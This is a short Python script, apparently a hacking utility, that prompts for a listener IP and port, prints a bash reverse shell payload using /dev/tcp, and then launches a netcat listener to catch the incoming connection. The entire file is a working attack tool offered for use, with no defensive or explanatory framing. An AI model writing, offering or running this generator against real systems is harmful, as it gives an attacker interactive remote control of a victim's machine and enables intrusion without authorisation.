import subprocess

def run():
    print("[*] Reverse shell generator")
    ip = input("Enter your listener IP: ")
    port = input("Enter listener port: ")

    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    print("[+] Payload Generated: ")
    print(payload)

    print("[*] Starting Netcat Listener...")
    subprocess.run(["nc", "-lvnp", port])
